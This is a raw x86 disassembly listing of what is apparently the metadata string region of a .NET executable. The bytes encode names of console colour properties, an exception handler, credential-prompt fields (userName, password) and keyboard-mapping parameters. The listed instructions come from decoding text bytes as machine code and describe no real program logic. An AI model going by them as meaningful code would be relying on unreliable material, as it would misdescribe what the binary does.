  40769d:	6f                   	outsl  %ds:(%esi),(%dx)
  40769e:	6c                   	insb   (%dx),%es:(%edi)
  40769f:	6f                   	outsl  %ds:(%esi),(%dx)
  4076a0:	72 00                	jb     0x4076a2
  4076a2:	67 65 74 5f          	addr16 gs je 0x407705
  4076a6:	56                   	push   %esi
  4076a7:	65 72 62             	gs jb  0x40770c
  4076aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ab:	73 65                	jae    0x407712
  4076ad:	46                   	inc    %esi
  4076ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4076af:	72 65                	jb     0x407716
  4076b1:	67 72 6f             	addr16 jb 0x407723
  4076b4:	75 6e                	jne    0x407724
  4076b6:	64 43                	fs inc %ebx
  4076b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b9:	6c                   	insb   (%dx),%es:(%edi)
  4076ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4076bb:	72 00                	jb     0x4076bd
  4076bd:	73 65                	jae    0x407724
  4076bf:	74 5f                	je     0x407720
  4076c1:	56                   	push   %esi
  4076c2:	65 72 62             	gs jb  0x407727
  4076c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4076c6:	73 65                	jae    0x40772d
  4076c8:	46                   	inc    %esi
  4076c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ca:	72 65                	jb     0x407731
  4076cc:	67 72 6f             	addr16 jb 0x40773e
  4076cf:	75 6e                	jne    0x40773f
  4076d1:	64 43                	fs inc %ebx
  4076d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4076d4:	6c                   	insb   (%dx),%es:(%edi)
  4076d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4076d6:	72 00                	jb     0x4076d8
  4076d8:	67 65 74 5f          	addr16 gs je 0x40773b
  4076dc:	56                   	push   %esi
  4076dd:	65 72 62             	gs jb  0x407742
  4076e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e1:	73 65                	jae    0x407748
  4076e3:	42                   	inc    %edx
  4076e4:	61                   	popa
  4076e5:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4076e8:	72 6f                	jb     0x407759
  4076ea:	75 6e                	jne    0x40775a
  4076ec:	64 43                	fs inc %ebx
  4076ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ef:	6c                   	insb   (%dx),%es:(%edi)
  4076f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f1:	72 00                	jb     0x4076f3
  4076f3:	73 65                	jae    0x40775a
  4076f5:	74 5f                	je     0x407756
  4076f7:	56                   	push   %esi
  4076f8:	65 72 62             	gs jb  0x40775d
  4076fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fc:	73 65                	jae    0x407763
  4076fe:	42                   	inc    %edx
  4076ff:	61                   	popa
  407700:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407703:	72 6f                	jb     0x407774
  407705:	75 6e                	jne    0x407775
  407707:	64 43                	fs inc %ebx
  407709:	6f                   	outsl  %ds:(%esi),(%dx)
  40770a:	6c                   	insb   (%dx),%es:(%edi)
  40770b:	6f                   	outsl  %ds:(%esi),(%dx)
  40770c:	72 00                	jb     0x40770e
  40770e:	67 65 74 5f          	addr16 gs je 0x407771
  407712:	50                   	push   %eax
  407713:	72 6f                	jb     0x407784
  407715:	67 72 65             	addr16 jb 0x40777d
  407718:	73 73                	jae    0x40778d
  40771a:	46                   	inc    %esi
  40771b:	6f                   	outsl  %ds:(%esi),(%dx)
  40771c:	72 65                	jb     0x407783
  40771e:	67 72 6f             	addr16 jb 0x407790
  407721:	75 6e                	jne    0x407791
  407723:	64 43                	fs inc %ebx
  407725:	6f                   	outsl  %ds:(%esi),(%dx)
  407726:	6c                   	insb   (%dx),%es:(%edi)
  407727:	6f                   	outsl  %ds:(%esi),(%dx)
  407728:	72 00                	jb     0x40772a
  40772a:	73 65                	jae    0x407791
  40772c:	74 5f                	je     0x40778d
  40772e:	50                   	push   %eax
  40772f:	72 6f                	jb     0x4077a0
  407731:	67 72 65             	addr16 jb 0x407799
  407734:	73 73                	jae    0x4077a9
  407736:	46                   	inc    %esi
  407737:	6f                   	outsl  %ds:(%esi),(%dx)
  407738:	72 65                	jb     0x40779f
  40773a:	67 72 6f             	addr16 jb 0x4077ac
  40773d:	75 6e                	jne    0x4077ad
  40773f:	64 43                	fs inc %ebx
  407741:	6f                   	outsl  %ds:(%esi),(%dx)
  407742:	6c                   	insb   (%dx),%es:(%edi)
  407743:	6f                   	outsl  %ds:(%esi),(%dx)
  407744:	72 00                	jb     0x407746
  407746:	67 65 74 5f          	addr16 gs je 0x4077a9
  40774a:	50                   	push   %eax
  40774b:	72 6f                	jb     0x4077bc
  40774d:	67 72 65             	addr16 jb 0x4077b5
  407750:	73 73                	jae    0x4077c5
  407752:	42                   	inc    %edx
  407753:	61                   	popa
  407754:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407757:	72 6f                	jb     0x4077c8
  407759:	75 6e                	jne    0x4077c9
  40775b:	64 43                	fs inc %ebx
  40775d:	6f                   	outsl  %ds:(%esi),(%dx)
  40775e:	6c                   	insb   (%dx),%es:(%edi)
  40775f:	6f                   	outsl  %ds:(%esi),(%dx)
  407760:	72 00                	jb     0x407762
  407762:	73 65                	jae    0x4077c9
  407764:	74 5f                	je     0x4077c5
  407766:	50                   	push   %eax
  407767:	72 6f                	jb     0x4077d8
  407769:	67 72 65             	addr16 jb 0x4077d1
  40776c:	73 73                	jae    0x4077e1
  40776e:	42                   	inc    %edx
  40776f:	61                   	popa
  407770:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407773:	72 6f                	jb     0x4077e4
  407775:	75 6e                	jne    0x4077e5
  407777:	64 43                	fs inc %ebx
  407779:	6f                   	outsl  %ds:(%esi),(%dx)
  40777a:	6c                   	insb   (%dx),%es:(%edi)
  40777b:	6f                   	outsl  %ds:(%esi),(%dx)
  40777c:	72 00                	jb     0x40777e
  40777e:	67 65 74 5f          	addr16 gs je 0x4077e1
  407782:	53                   	push   %ebx
  407783:	68 6f 75 6c 64       	push   $0x646c756f
  407788:	45                   	inc    %ebp
  407789:	78 69                	js     0x4077f4
  40778b:	74 00                	je     0x40778d
  40778d:	73 65                	jae    0x4077f4
  40778f:	74 5f                	je     0x4077f0
  407791:	53                   	push   %ebx
  407792:	68 6f 75 6c 64       	push   $0x646c756f
  407797:	45                   	inc    %ebp
  407798:	78 69                	js     0x407803
  40779a:	74 00                	je     0x40779c
  40779c:	67 65 74 5f          	addr16 gs je 0x4077ff
  4077a0:	45                   	inc    %ebp
  4077a1:	78 69                	js     0x40780c
  4077a3:	74 43                	je     0x4077e8
  4077a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4077a6:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4077ab:	74 5f                	je     0x40780c
  4077ad:	45                   	inc    %ebp
  4077ae:	78 69                	js     0x407819
  4077b0:	74 43                	je     0x4077f5
  4077b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b3:	64 65 00 53 68       	fs add %dl,%gs:0x68(%ebx)
  4077b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b9:	75 6c                	jne    0x407827
  4077bb:	64 45                	fs inc %ebp
  4077bd:	78 69                	js     0x407828
  4077bf:	74 00                	je     0x4077c1
  4077c1:	45                   	inc    %ebp
  4077c2:	78 69                	js     0x40782d
  4077c4:	74 43                	je     0x407809
  4077c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4077c7:	64 65 00 73 68       	fs add %dh,%gs:0x68(%ebx)
  4077cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4077cd:	75 6c                	jne    0x40783b
  4077cf:	64 45                	fs inc %ebp
  4077d1:	78 69                	js     0x40783c
  4077d3:	74 00                	je     0x4077d5
  4077d5:	65 78 69             	gs js  0x407841
  4077d8:	74 43                	je     0x40781d
  4077da:	6f                   	outsl  %ds:(%esi),(%dx)
  4077db:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  4077e0:	69 6e 00 55 6e 68 61 	imul   $0x61686e55,0x0(%esi),%ebp
  4077e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e8:	64 6c                	fs insb (%dx),%es:(%edi)
  4077ea:	65 64 45             	gs fs inc %ebp
  4077ed:	78 63                	js     0x407852
  4077ef:	65 70 74             	gs jo  0x407866
  4077f2:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4077f9:	74 41                	je     0x40783c
  4077fb:	72 67                	jb     0x407864
  4077fd:	73 00                	jae    0x4077ff
  4077ff:	43                   	inc    %ebx
  407800:	75 72                	jne    0x407874
  407802:	72 65                	jb     0x407869
  407804:	6e                   	outsb  %ds:(%esi),(%dx)
  407805:	74 44                	je     0x40784b
  407807:	6f                   	outsl  %ds:(%esi),(%dx)
  407808:	6d                   	insl   (%dx),%es:(%edi)
  407809:	61                   	popa
  40780a:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  407811:	6e                   	outsb  %ds:(%esi),(%dx)
  407812:	64 6c                	fs insb (%dx),%es:(%edi)
  407814:	65 64 45             	gs fs inc %ebp
  407817:	78 63                	js     0x40787c
  407819:	65 70 74             	gs jo  0x407890
  40781c:	69 6f 6e 00 63 72 65 	imul   $0x65726300,0x6e(%edi),%ebp
  407823:	64 69 6e 66 6f 00 74 	imul   $0x6174006f,%fs:0x66(%esi),%ebp
  40782a:	61 
  40782b:	72 67                	jb     0x407894
  40782d:	65 74 4e             	gs je  0x40787e
  407830:	61                   	popa
  407831:	6d                   	insl   (%dx),%es:(%edi)
  407832:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  407836:	73 65                	jae    0x40789d
  407838:	72 76                	jb     0x4078b0
  40783a:	65 64 31 00          	gs xor %eax,%fs:(%eax)
  40783e:	69 45 72 72 6f 72 00 	imul   $0x726f72,0x72(%ebp),%eax
  407845:	75 73                	jne    0x4078ba
  407847:	65 72 4e             	gs jb  0x407898
  40784a:	61                   	popa
  40784b:	6d                   	insl   (%dx),%es:(%edi)
  40784c:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  407850:	78 55                	js     0x4078a7
  407852:	73 65                	jae    0x4078b9
  407854:	72 4e                	jb     0x4078a4
  407856:	61                   	popa
  407857:	6d                   	insl   (%dx),%es:(%edi)
  407858:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  40785c:	73 73                	jae    0x4078d1
  40785e:	77 6f                	ja     0x4078cf
  407860:	72 64                	jb     0x4078c6
  407862:	00 6d 61             	add    %ch,0x61(%ebp)
  407865:	78 50                	js     0x4078b7
  407867:	61                   	popa
  407868:	73 73                	jae    0x4078dd
  40786a:	77 6f                	ja     0x4078db
  40786c:	72 64                	jb     0x4078d2
  40786e:	00 70 66             	add    %dh,0x66(%eax)
  407871:	53                   	push   %ebx
  407872:	61                   	popa
  407873:	76 65                	jbe    0x4078da
  407875:	00 53 79             	add    %dl,0x79(%ebx)
  407878:	73 74                	jae    0x4078ee
  40787a:	65 6d                	gs insl (%dx),%es:(%edi)
  40787c:	2e 52                	cs push %edx
  40787e:	75 6e                	jne    0x4078ee
  407880:	74 69                	je     0x4078eb
  407882:	6d                   	insl   (%dx),%es:(%edi)
  407883:	65 2e 49             	gs cs dec %ecx
  407886:	6e                   	outsb  %ds:(%esi),(%dx)
  407887:	74 65                	je     0x4078ee
  407889:	72 6f                	jb     0x4078fa
  40788b:	70 53                	jo     0x4078e0
  40788d:	65 72 76             	gs jb  0x407906
  407890:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  407897:	72 73                	jb     0x40790c
  407899:	68 61 6c 41 73       	push   $0x73416c61
  40789e:	41                   	inc    %ecx
  40789f:	74 74                	je     0x407915
  4078a1:	72 69                	jb     0x40790c
  4078a3:	62 75 74             	bound  %esi,0x74(%ebp)
  4078a6:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  4078aa:	6d                   	insl   (%dx),%es:(%edi)
  4078ab:	61                   	popa
  4078ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ad:	61                   	popa
  4078ae:	67 65 64 54          	addr16 gs fs push %esp
  4078b2:	79 70                	jns    0x407924
  4078b4:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  4078b8:	61                   	popa
  4078b9:	67 73 00             	addr16 jae 0x4078bc
  4078bc:	63 61 70             	arpl   %esp,0x70(%ecx)
  4078bf:	74 69                	je     0x40792a
  4078c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c3:	00 6d 65             	add    %ch,0x65(%ebp)
  4078c6:	73 73                	jae    0x40793b
  4078c8:	61                   	popa
  4078c9:	67 65 00 74 61       	add    %dh,%gs:0x61(%si)
  4078ce:	72 67                	jb     0x407937
  4078d0:	65 74 00             	gs je  0x4078d3
  4078d3:	75 73                	jne    0x407948
  4078d5:	65 72 00             	gs jb  0x4078d8
  4078d8:	63 72 65             	arpl   %esi,0x65(%edx)
  4078db:	64 54                	fs push %esp
  4078dd:	79 70                	jns    0x40794f
  4078df:	65 73 00             	gs jae 0x4078e2
  4078e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e3:	70 74                	jo     0x407959
  4078e5:	69 6f 6e 73 00 76 61 	imul   $0x61760073,0x6e(%edi),%ebp
  4078ec:	6c                   	insb   (%dx),%es:(%edi)
  4078ed:	75 65                	jne    0x407954
  4078ef:	00 72 65             	add    %dh,0x65(%edx)
  4078f2:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  4078f6:	67 6c                	insb   (%dx),%es:(%di)
  4078f8:	65 00 73 6f          	add    %dh,%gs:0x6f(%ebx)
  4078fc:	75 72                	jne    0x407970
  4078fe:	63 65 00             	arpl   %esp,0x0(%ebp)
  407901:	64 65 73 74          	fs gs jae 0x407979
  407905:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  40790c:	00 63 6c             	add    %ah,0x6c(%ebx)
  40790f:	69 70 00 66 69 6c 6c 	imul   $0x6c6c6966,0x0(%eax),%esi
  407916:	00 6f 72             	add    %ch,0x72(%edi)
  407919:	69 67 69 6e 00 63 6f 	imul   $0x6f63006e,0x69(%edi),%esp
  407920:	6e                   	outsb  %ds:(%esi),(%dx)
  407921:	74 65                	je     0x407988
  407923:	6e                   	outsb  %ds:(%esi),(%dx)
  407924:	74 73                	je     0x407999
  407926:	00 73 74             	add    %dh,0x74(%ebx)
  407929:	72 49                	jb     0x407974
  40792b:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  40792f:	72 54                	jb     0x407985
  407931:	69 74 6c 65 00 73 74 	imul   $0x72747300,0x65(%esp,%ebp,2),%esi
  407938:	72 
  407939:	50                   	push   %eax
  40793a:	72 6f                	jb     0x4079ab
  40793c:	6d                   	insl   (%dx),%es:(%edi)
  40793d:	70 74                	jo     0x4079b3
  40793f:	00 73 74             	add    %dh,0x74(%ebx)
  407942:	72 56                	jb     0x40799a
  407944:	61                   	popa
  407945:	6c                   	insb   (%dx),%es:(%edi)
  407946:	00 62 6c             	add    %ah,0x6c(%edx)
  407949:	53                   	push   %ebx
  40794a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40794e:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  407952:	72 43                	jb     0x407997
  407954:	68 6f 69 63 65       	push   $0x6563696f
  407959:	00 69 6e             	add    %ch,0x6e(%ecx)
  40795c:	74 44                	je     0x4079a2
  40795e:	65 66 61             	gs popaw
  407961:	75 6c                	jne    0x4079cf
  407963:	74 00                	je     0x407965
  407965:	77 56                	ja     0x4079bd
  407967:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  40796e:	77 53                	ja     0x4079c3
  407970:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  407973:	43                   	inc    %ebx
  407974:	6f                   	outsl  %ds:(%esi),(%dx)
  407975:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  40797b:	65 79 53             	gs jns 0x4079d1
  40797e:	74 61                	je     0x4079e1
  407980:	74 65                	je     0x4079e7
  407982:	00 70 77             	add    %dh,0x77(%eax)
  407985:	73 7a                	jae    0x407a01
  407987:	42                   	inc    %edx
  407988:	75 66                	jne    0x4079f0
  40798a:	66 00 4f 75          	data16 add %cl,0x75(%edi)
  40798e:	74 41                	je     0x4079d1
  407990:	74 74                	je     0x407a06
  407992:	72 69                	jb     0x4079fd
  407994:	62 75 74             	bound  %esi,0x74(%ebp)
  407997:	65 00 63 63          	add    %ah,%gs:0x63(%ebx)
  40799b:	68 42 75 66 66       	push   $0x66667542
  4079a0:	00 77 46             	add    %dh,0x46(%edi)
  4079a3:	6c                   	insb   (%dx),%es:(%edi)
  4079a4:	61                   	popa
  4079a5:	67 73 00             	addr16 jae 0x4079a8
  4079a8:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  4079ac:	00 62 6c             	add    %ah,0x6c(%edx)
  4079af:	53                   	push   %ebx
  4079b0:	68 69 66 74 00       	push   $0x746669
  4079b5:	62 6c 41 6c          	bound  %ebp,0x6c(%ecx,%eax,2)
  4079b9:	74 47                	je     0x407a02
  4079bb:	72 00                	jb     0x4079bd
  4079bd:	62 6c 49 6e          	bound  %ebp,0x6e(%ecx,%ecx,2)
  4079c1:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  4079c5:	65 4b                	gs dec %ebx
  4079c7:	65 79 44             	gs jns 0x407a0e
  4079ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4079cb:	77 6e                	ja     0x407a3b
  4079cd:	00 73 65             	add    %dh,0x65(%ebx)
  4079d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d1:	64 65 72 00          	fs gs jb 0x4079d5
  4079d5:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  4079d9:	6c                   	insb   (%dx),%es:(%edi)
  4079da:	6f                   	outsl  %ds:(%esi),(%dx)
  4079db:	72 00                	jb     0x4079dd
  4079dd:	70 64                	jo     0x407a43
  4079df:	00 70 6f             	add    %dh,0x6f(%eax)
  4079e2:	73 69                	jae    0x407a4d
  4079e4:	74 69                	je     0x407a4f
  4079e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4079e8:	00 42 61             	add    %al,0x61(%edx)
  4079eb:	72 43                	jb     0x407a30
  4079ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ee:	6c                   	insb   (%dx),%es:(%edi)
  4079ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f0:	72 00                	jb     0x4079f2
  4079f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f3:	62 6a 52             	bound  %ebp,0x52(%edx)
  4079f6:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4079fa:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  4079fe:	64 48                	fs dec %eax
  407a00:	61                   	popa
  407a01:	6e                   	outsb  %ds:(%esi),(%dx)
  407a02:	64 6c                	fs insb (%dx),%es:(%edi)
  407a04:	65 00 68 46          	add    %ch,%gs:0x46(%eax)
  407a08:	69 6c 65 00 64 65 73 	imul   $0x63736564,0x0(%ebp,%eiz,2),%ebp
  407a0f:	63 
  407a10:	72 69                	jb     0x407a7b
  407a12:	70 74                	jo     0x407a88
  407a14:	69 6f 6e 73 00 63 68 	imul   $0x68630073,0x6e(%edi),%ebp
  407a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1c:	69 63 65 73 00 64 65 	imul   $0x65640073,0x65(%ebx),%esp
  407a23:	66 61                	popaw
  407a25:	75 6c                	jne    0x407a93
  407a27:	74 43                	je     0x407a6c
  407a29:	68 6f 69 63 65       	push   $0x6563696f
  407a2e:	00 61 6c             	add    %ah,0x6c(%ecx)
  407a31:	6c                   	insb   (%dx),%es:(%edi)
  407a32:	6f                   	outsl  %ds:(%esi),(%dx)
  407a33:	77 65                	ja     0x407a9a
  407a35:	64 43                	fs inc %ebx
  407a37:	72 65                	jb     0x407a9e
  407a39:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407a3c:	74 69                	je     0x407aa7
  407a3e:	61                   	popa
  407a3f:	6c                   	insb   (%dx),%es:(%edi)
  407a40:	54                   	push   %esp
  407a41:	79 70                	jns    0x407ab3
  407a43:	65 73 00             	gs jae 0x407a46
  407a46:	66 6f                	outsw  %ds:(%esi),(%dx)
  407a48:	72 65                	jb     0x407aaf
  407a4a:	67 72 6f             	addr16 jb 0x407abc
  407a4d:	75 6e                	jne    0x407abd
  407a4f:	64 43                	fs inc %ebx
  407a51:	6f                   	outsl  %ds:(%esi),(%dx)
  407a52:	6c                   	insb   (%dx),%es:(%edi)
  407a53:	6f                   	outsl  %ds:(%esi),(%dx)
  407a54:	72 00                	jb     0x407a56
  407a56:	62 61 63             	bound  %esp,0x63(%ecx)
  407a59:	6b 67 72 6f          	imul   $0x6f,0x72(%edi),%esp
  407a5d:	75 6e                	jne    0x407acd
  407a5f:	64 43                	fs inc %ebx
  407a61:	6f                   	outsl  %ds:(%esi),(%dx)
  407a62:	6c                   	insb   (%dx),%es:(%edi)
  407a63:	6f                   	outsl  %ds:(%esi),(%dx)
  407a64:	72 00                	jb     0x407a66
  407a66:	73 6f                	jae    0x407ad7
  407a68:	75 72                	jne    0x407adc
  407a6a:	63 65 49             	arpl   %esp,0x49(%ebp)
  407a6d:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  407a71:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407a74:	64 00 61 70          	add    %ah,%fs:0x70(%ecx)
  407a78:	70 00                	jo     0x407a7a
  407a7a:	61                   	popa
  407a7b:	72 67                	jb     0x407ae4
  407a7d:	73 00                	jae    0x407a7f
  407a7f:	53                   	push   %ebx
  407a80:	79 73                	jns    0x407af5
  407a82:	74 65                	je     0x407ae9
  407a84:	6d                   	insl   (%dx),%es:(%edi)
  407a85:	2e 52                	cs push %edx
  407a87:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  407a8a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407a8f:	6e                   	outsb  %ds:(%esi),(%dx)
  407a90:	00 41 73             	add    %al,0x73(%ecx)
  407a93:	73 65                	jae    0x407afa
  407a95:	6d                   	insl   (%dx),%es:(%edi)
  407a96:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407a9a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407aa1:	72 
  407aa2:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407aa9:	73 73                	jae    0x407b1e
  407aab:	65 6d                	gs insl (%dx),%es:(%edi)
  407aad:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407ab1:	72 6f                	jb     0x407b22
  407ab3:	64 75 63             	fs jne 0x407b19
  407ab6:	74 41                	je     0x407af9
  407ab8:	74 74                	je     0x407b2e
  407aba:	72 69                	jb     0x407b25
  407abc:	62 75 74             	bound  %esi,0x74(%ebp)
  407abf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ac3:	73 65                	jae    0x407b2a
  407ac5:	6d                   	insl   (%dx),%es:(%edi)
  407ac6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407aca:	6f                   	outsl  %ds:(%esi),(%dx)
  407acb:	70 79                	jo     0x407b46
  407acd:	72 69                	jb     0x407b38
  407acf:	67 68 74 41 74 74    	addr16 push $0x74744174
  407ad5:	72 69                	jb     0x407b40
  407ad7:	62 75 74             	bound  %esi,0x74(%ebp)
  407ada:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ade:	73 65                	jae    0x407b45
  407ae0:	6d                   	insl   (%dx),%es:(%edi)
  407ae1:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407ae5:	72 61                	jb     0x407b48
  407ae7:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407aea:	61                   	popa
  407aeb:	72 6b                	jb     0x407b58
  407aed:	41                   	inc    %ecx
  407aee:	74 74                	je     0x407b64
  407af0:	72 69                	jb     0x407b5b
  407af2:	62 75 74             	bound  %esi,0x74(%ebp)
  407af5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407af9:	73 65                	jae    0x407b60
  407afb:	6d                   	insl   (%dx),%es:(%edi)
  407afc:	62 6c 79 56          	bound  %ebp,0x56(%ecx,%edi,2)
  407b00:	65 72 73             	gs jb  0x407b76
  407b03:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407b0a:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407b11:	73 73                	jae    0x407b86
  407b13:	65 6d                	gs insl (%dx),%es:(%edi)
  407b15:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407b19:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407b20:	69 
  407b21:	6f                   	outsl  %ds:(%esi),(%dx)
  407b22:	6e                   	outsb  %ds:(%esi),(%dx)
  407b23:	41                   	inc    %ecx
  407b24:	74 74                	je     0x407b9a
  407b26:	72 69                	jb     0x407b91
  407b28:	62 75 74             	bound  %esi,0x74(%ebp)
  407b2b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407b2f:	73 65                	jae    0x407b96
  407b31:	6d                   	insl   (%dx),%es:(%edi)
  407b32:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407b36:	65 73 63             	gs jae 0x407b9c
  407b39:	72 69                	jb     0x407ba4
  407b3b:	70 74                	jo     0x407bb1
  407b3d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407b44:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407b4b:	73 73                	jae    0x407bc0
  407b4d:	65 6d                	gs insl (%dx),%es:(%edi)
  407b4f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407b53:	6f                   	outsl  %ds:(%esi),(%dx)
  407b54:	6d                   	insl   (%dx),%es:(%edi)
  407b55:	70 61                	jo     0x407bb8
  407b57:	6e                   	outsb  %ds:(%esi),(%dx)
  407b58:	79 41                	jns    0x407b9b
  407b5a:	74 74                	je     0x407bd0
  407b5c:	72 69                	jb     0x407bc7
  407b5e:	62 75 74             	bound  %esi,0x74(%ebp)
  407b61:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407b65:	73 74                	jae    0x407bdb
  407b67:	65 6d                	gs insl (%dx),%es:(%edi)
  407b69:	2e 52                	cs push %edx
  407b6b:	75 6e                	jne    0x407bdb
  407b6d:	74 69                	je     0x407bd8
  407b6f:	6d                   	insl   (%dx),%es:(%edi)
  407b70:	65 2e 43             	gs cs inc %ebx
  407b73:	6f                   	outsl  %ds:(%esi),(%dx)
  407b74:	6d                   	insl   (%dx),%es:(%edi)
  407b75:	70 69                	jo     0x407be0
  407b77:	6c                   	insb   (%dx),%es:(%edi)
  407b78:	65 72 53             	gs jb  0x407bce
  407b7b:	65 72 76             	gs jb  0x407bf4
  407b7e:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407b85:	6d                   	insl   (%dx),%es:(%edi)
  407b86:	70 69                	jo     0x407bf1
  407b88:	6c                   	insb   (%dx),%es:(%edi)
  407b89:	61                   	popa
  407b8a:	74 69                	je     0x407bf5
  407b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8d:	6e                   	outsb  %ds:(%esi),(%dx)
  407b8e:	52                   	push   %edx
  407b8f:	65 6c                	gs insb (%dx),%es:(%edi)
  407b91:	61                   	popa
  407b92:	78 61                	js     0x407bf5
  407b94:	74 69                	je     0x407bff
  407b96:	6f                   	outsl  %ds:(%esi),(%dx)
  407b97:	6e                   	outsb  %ds:(%esi),(%dx)
  407b98:	73 41                	jae    0x407bdb
  407b9a:	74 74                	je     0x407c10
  407b9c:	72 69                	jb     0x407c07
  407b9e:	62 75 74             	bound  %esi,0x74(%ebp)
  407ba1:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba6:	74 69                	je     0x407c11
  407ba8:	6d                   	insl   (%dx),%es:(%edi)
  407ba9:	65 43                	gs inc %ebx
  407bab:	6f                   	outsl  %ds:(%esi),(%dx)
  407bac:	6d                   	insl   (%dx),%es:(%edi)
  407bad:	70 61                	jo     0x407c10
  407baf:	74 69                	je     0x407c1a
  407bb1:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407bb4:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407bbb:	69 
  407bbc:	62 75 74             	bound  %esi,0x74(%ebp)
  407bbf:	65 00 68 78          	add    %ch,%gs:0x78(%eax)
  407bc3:	30 7a 78             	xor    %bh,0x78(%edx)
  407bc6:	39 78 00             	cmp    %edi,0x0(%eax)
  407bc9:	44                   	inc    %esp
  407bca:	6c                   	insb   (%dx),%es:(%edi)
  407bcb:	6c                   	insb   (%dx),%es:(%edi)
  407bcc:	49                   	dec    %ecx
  407bcd:	6d                   	insl   (%dx),%es:(%edi)
  407bce:	70 6f                	jo     0x407c3f
  407bd0:	72 74                	jb     0x407c46
  407bd2:	41                   	inc    %ecx
  407bd3:	74 74                	je     0x407c49
  407bd5:	72 69                	jb     0x407c40
  407bd7:	62 75 74             	bound  %esi,0x74(%ebp)
